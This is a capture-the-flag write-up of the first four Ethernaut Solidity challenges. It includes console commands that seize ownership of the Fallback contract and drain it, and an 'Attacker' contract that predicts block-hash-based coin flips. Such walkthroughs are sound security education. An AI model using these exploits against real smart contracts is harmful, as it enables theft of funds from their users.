---
title: The Ethernaut CTF Writeup
date: 2022-12-08
categories: [writeup,ethernaut]
tags: [writeup,ethernaut] #always lowercase
---

This is a write-up for The Ethernaut CTF collection of challenges. The Ethernaut is a Web3/Solidity based wargame played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.

## 1. Hello Ethernaut 🙌🏻
> This level walks you through the very basics of how to play the game.

This level exposes the basics in order to play the Ethernaut. `contract.info()` returns info from the 
contract. We receive: 'You will find what you need in info1().' `contract.info1()` returns 'Try info2(), but with "hello" as a parameter.' We already see a pattern where info methods will return instructions for nexts steps. In security, we need to be fast and work smart, not hard. We can use `contract.methods`, which returns all the methods for the contract. After checking all contract methods, see the `password()` method and the `authenticate()` method (which takes a string as param). We deduce that `password()` will return the parameter needed to authenticate ourselves via `authenticate()`. So we first run `password()`, which returns ethernaut0. We then call `authenticate()` with ethernaut0 as param and... voilà! First Ethernaut level completed ✅

## 2. Fallback 💰
> Look carefully at the contract's code below.
> You will beat this level if
> - you claim ownership of the contract
> - you reduce its balance to 0  
> 
> Things that might help: 
> - How to send ether when interacting with an ABI
> - How to send ether outside of the ABI
> - Converting to and from wei/ether units (see help() command)
> - Fallback methods

The second Ethernaut level consists in a contract that allows users to make contributions through `contribute()`. We can see in the `contribute()` method that if the contribution is higher than the highest contribution, we'll become the new contract owner.
``` solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
The contract has an initial owner which is set in the constructor, and only the owner is allowed to withdraw all the contract's funds via `withdraw()` (which has the well-known `onlyOwner` modifier):
``` solidity
function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```
We could become the owners by contributing more than the highest contribution, but this is a pretty high contribution done by the initial owner in the constructor (1000 ether), so we'll have to break the contract😈:
``` solidity
constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

```

We see that contract has a `receive()` method, which allows changing the owner of the contract just by sending an amount of ether higher than 0 if we have at least a contribution higher than 0:
``` solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
````
In Solidity, fallback functions `receive()` and `fallback()` are used in two different ways: 
- `receive()`: contract received ether and no data. If `receive()` does not exist in the contract, `fallback()` will be triggered. Forced to be `payable`.
- `fallback()`: contract received data but no function matched the function called, or contract received ether but no `receive()` function was found. Optionally `payable`.

Here's an easy diagram to better understand how receive and fallback work:
![diagram]()

Knowing this, we can contribute a small amount of ether via `contribute()` in order to bypass the `contributions[msg.sender] > 0` check:
```javascript
await contract.contribute({value: toWei('0.000000000001')});
```
If we check the owner via `contract.owner()` we see that it still is 0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F. We still need to send the ether to trigger the receive() function.
We can do this just by sending some ether directly to the contract, and like this we can become the owner and then withdraw all contract's ether:
 
```javascript
await contract.send(toWei('0.000000000001'))
```

We'll see we are the owners now. The requirements for completing the level were becoming owners and draining the contract. Being the owners, we can directly call `withdraw()` and become the contract's owners.

```javascript
await contract.withdraw();
```
 Second Ethernaut level completed ✅

## 3. Fallout 1️⃣
> Claim ownership of the contract below to complete this level.
> Things that might help
> - Solidity Remix IDE

This level is just looking to confuse us by making us believe that the `Fal1out()` function is the constructor of the contract:
```solidity
/* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```
Prior to version 0.4.22 of Solidity, constructors were defined as functions with the same name as the contract. We could think that this is the case for this contract, but two things make us detect that this is not the case:
- The version of the contract is ^0.6.0, so constructor can only be defined with the `constructor()` keyword 
- The name of the function commented as "constructor" is Fal1out (it has a number 1 instead of an L), so the name of the contract is not the same as the function. Even if the contract's version was one prior to 0.4.22, this function would not work as constructor because the name of the contract and the function name are different. 

In order to claim ownership of the contract, we just need to call the `Fal1out()` function:
```javascript
await contract.Fal1out({value: toWei("0.00000001")})
```
This level is a quckly reminder of how important it is to be fully focused and don't let ourselves be guided by comments when auditing code.

Third Ethernaut level completed ✅

## 4. Coin Flip 🪙
>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
> Things that might help
> - See the Help page above, section "Beyond the console"

In this challenge, we need to flip the coin 10 times and guess the correct side 10 out of 10 times in order to pass the level:
``` solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```
Things to consider: 
- We can't trigger the `flip()` function 10 times in the same block due to the first check of the function ensuring that the current `blockValue` is different from the previously stored one.
- If we guess correctly, `consecutiveWins` will increase for us, otherwise it'll be reset

This function tries to leverage `block.value` in order to create a kind of randomness. In reality, this is not completely random, because Solidity contracts are deterministic. We can anticipate the CoinFlip contract's results and use this information to exploit it. In this case, we can easily detect which will be the value to pass to the function by creating a contract that performs the same exact calculations that the `flip()` function carries out, and then call `flip()` in the same transaction with the boolean value obtained from doing said calculations. We can build a simple contract in remix to do this:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}
contract Attacker {

    ICoinFlip public iCoinFlip;

    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _coinFlip) {
        iCoinFlip = ICoinFlip(_coinFlip);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        iCoinFlip.flip(side);
    }
}
```

Then, we can call `attack()` 10 times (making sure we call it in a different block from the one in the previous transaction) and we'll flip the coin correctly 10 straigth times! We could also automate this using ethers.js and looping for 10 times, interacting with the contract every time a block is added to the blockchain to surpass the contract's block check.
Fourth Ethernaut level completed ✅